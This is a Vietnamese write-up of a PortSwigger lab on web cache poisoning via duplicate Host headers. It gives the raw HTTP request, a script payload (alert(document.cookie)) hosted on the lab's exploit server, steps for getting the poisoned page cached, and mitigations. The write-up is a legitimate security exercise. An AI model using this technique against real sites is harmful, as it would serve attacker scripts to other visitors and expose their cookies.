---
title: "[PortSwigger] Lab 2: Web Cache Poisoning via Ambiguous Requests"
date: 2026-09-14
description: "Khai thác lỗ hổng Web Cache Poisoning thông qua sự bất đồng bộ trong việc xử lý hai header Host trùng lặp giữa tầng Cache và tầng Backend."
categories: ["PortSwigger Labs"]
series: ["HTTP Host Header Attacks"]
series_order: 2
showAuthor: false
showTableOfContents: true
---

## Thông tin bài Lab
* **Tên bài Lab**: Web cache poisoning via ambiguous requests
* **Chuyên đề**: HTTP Host Header attacks
* **Mức độ**: Practitioner
* **Mục tiêu**: Đầu độc bộ nhớ đệm (Web Cache) của trang chủ để thực thi mã JavaScript độc hại (`alert(document.cookie)`) trên trình duyệt của nạn nhân.

---

## 1. Mô tả bài toán & Trinh sát (Reconnaissance)

Trang chủ của bài lab sử dụng cơ chế lưu đệm (Caching) cho các tài nguyên tĩnh và tài liệu HTML. Khi phân tích phản hồi, ta thấy hệ thống import một file JavaScript tĩnh:

```html
<script type="text/javascript" src="//YOUR-LAB-ID.web-security-academy.net/resources/js/tracking.js"></script>
```

Đường dẫn tuyệt đối này được sinh tự động dựa trên header `Host`. Đồng thời, response trả về các header cache đặc trưng:
* `X-Cache: hit` / `X-Cache: miss`
* `Age: <seconds>`

---

## 2. Cơ chế phát sinh lỗ hổng

Khi một request chứa **2 header `Host` trùng lặp**:
1. Tầng **Reverse Proxy / Cache** chỉ quan sát và dùng header `Host` đầu tiên để định tuyến và tạo Cache Key.
2. Tầng **Backend Server** (hoặc framework) lại đọc header `Host` thứ hai để sinh đường dẫn nhúng file script `tracking.js`.

Do đó, ta có thể lưu một trang chủ bị đầu độc đường dẫn script vào bộ nhớ đệm chung của hệ thống.

---

## 3. Khai thác lỗ hổng (PoC Step-by-Step)

### Bước 1: Chuẩn bị file script độc hại trên Exploit Server
1. Truy cập **Exploit Server**.
2. Đặt trường **File** thành: `/resources/js/tracking.js`
3. Phần **Body** nhập payload:
   ```javascript
   alert(document.cookie);
   ```
4. Bấm **Store** để lưu file.

### Bước 2: Gửi request chứa Duplicate Host trong Burp Repeater
Chuyển request `GET /` sang Repeater và thêm header `Host` thứ hai trỏ đến Exploit Server:

```http
GET / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Host: exploit-YOUR-EXPLOIT-SERVER-ID.exploit-server.net
User-Agent: Mozilla/5.0
...
```

Kiểm tra phản hồi:
```html
<script type="text/javascript" src="//exploit-YOUR-EXPLOIT-SERVER-ID.exploit-server.net/resources/js/tracking.js"></script>
```

### Bước 3: Đầu độc Cache
Gửi request liên tục cho đến khi header trả về `X-Cache: hit` (khi cache key được làm mới). Lúc này người dùng truy cập trang chủ sẽ tải file `tracking.js` từ Exploit Server và kích hoạt hàm `alert()`. Bài lab được giải thành công!

---

## 4. Biện pháp khắc phục (Mitigation)
* **Từ chối các request có nhiều header `Host`**: Cấu hình HTTP parser ở tầng Proxy/CDN từ chối ngay lập tức (trả về mã lỗi `400 Bad Request`) nếu xuất hiện nhiều hơn một header `Host`.
* **Sử dụng đường dẫn tương đối (Relative URLs)** cho việc nhúng tài nguyên tĩnh: `<script src="/resources/js/tracking.js"></script>`.
